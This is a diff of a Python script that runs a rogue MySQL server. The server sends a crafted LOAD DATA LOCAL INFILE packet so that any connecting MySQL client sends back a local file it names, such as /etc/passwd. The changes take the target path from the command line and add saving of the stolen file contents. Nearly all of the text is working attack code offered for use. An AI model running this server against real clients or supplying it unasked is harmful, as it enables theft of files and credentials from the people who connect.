@@ -2,12 +2,15 @@
 #coding: utf8
 import socket
 import time
+import sys
 
-# linux :
-filestring = "/etc/passwd"
-# windows:
-#filestring = "C:\Windows\system32\drivers\etc\hosts"
-HOST = "0.0.0.0" # open for eeeeveryone! ^_^
+if len(sys.argv) == 1:
+    sys.exit("usage: python 1.py /etc/passwd (outputfile)")
+else:
+    filestring = sys.argv[1]
+    print filestring
+
+HOST = "0.0.0.0"
 PORT = 3306
 BUFFER_SIZE = 1024
 
@@ -23,27 +26,30 @@ s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 s.bind((HOST, PORT))
 s.listen(1)
 
-while True:
-    filestring = raw_input('input ReadFilePath:> ')
-    payloadlen = chr(len(filestring) + 1)
-    padding = "\x00\x00\x01\xfb"
-    payload = payloadlen + padding + bytes(filestring)
-    print '[*] server ready. wait for client...'
-    conn, addr = s.accept()
 
-    print 'Connection from:', addr
-    conn.send(greeting)
-    while True:
-        data = conn.recv(BUFFER_SIZE)
-        print " ".join("%02x" % ord(i) for i in data)
-        conn.send(authok)
-        data = conn.recv(BUFFER_SIZE)
-        conn.send(payload)
-        print "[*] Payload send!"
-        data = conn.recv(BUFFER_SIZE)
-        #time.sleep(5)
-        if not data: break
-        print "Data received:\n", data
-        break
-    # Don't leave the connection open.
-    conn.close()
+payloadlen = chr(len(filestring) + 1)
+padding = "\x00\x00\x01\xfb"
+payload = payloadlen + padding + bytes(filestring)
+print('[*] server ready. wait for client...')
+conn, addr = s.accept()
+
+print('Connection from:', addr)
+conn.send(greeting)
+while True:
+    data = conn.recv(BUFFER_SIZE)
+    # print " ".join("%02x" % ord(i) for i in data)
+    conn.send(authok)
+    data = conn.recv(BUFFER_SIZE)
+    conn.send(payload)
+    print("[*] Payload send!")
+    data = conn.recv(BUFFER_SIZE)
+    # time.sleep(5)
+    if not data: break
+    print "Data received:\n", data[4:-4]
+    if len(sys.argv) == 3:
+        with open(sys.argv[2],"wb") as f:
+            f.write(data[4:-4])
+    break
+
+# Don't leave the connection open.
+conn.close()
